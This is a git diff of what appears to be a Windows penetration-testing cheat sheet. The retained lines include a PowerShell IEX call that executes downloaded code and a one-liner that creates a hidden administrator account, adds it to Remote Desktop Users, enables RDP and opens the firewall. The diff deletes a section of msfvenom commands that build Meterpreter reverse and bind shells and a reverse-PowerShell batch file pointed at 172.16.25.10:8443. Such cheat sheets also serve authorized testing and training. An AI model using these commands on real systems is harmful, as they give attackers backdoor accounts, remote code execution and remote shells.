@@ -150,17 +150,4 @@ IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
 net user <USERNAME> <PASSWORD> /add /Y  && net localgroup administrators <USERNAME> /add && net localgroup "Remote Desktop Users" <USERNAME> /add && reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
 ```
 
-#### Usefull payload
-```
-# Meterpreter ps1 rev shell
-msfvenom -p windows/x64/meterpreter_reverse_https -f psh -o msf.ps1 lhost=<HOST> lport=<PORT> exitfunc=thread
 
-# Meterpreter bind tcp executable
-msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=<HOST> LPORT=<PORT> -f exe -o bind_tcp.exe
-
-# Meterpreter reverse tcp executable
-Msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<HOST> LPORT=<PORT> -f exe > shell.exe
-
-# Bat file to run reverse powershell
-msfvenom -p cmd/windows/reverse_powershell LHOST=172.16.25.10 LPORT=8443 > attach.bat
-```
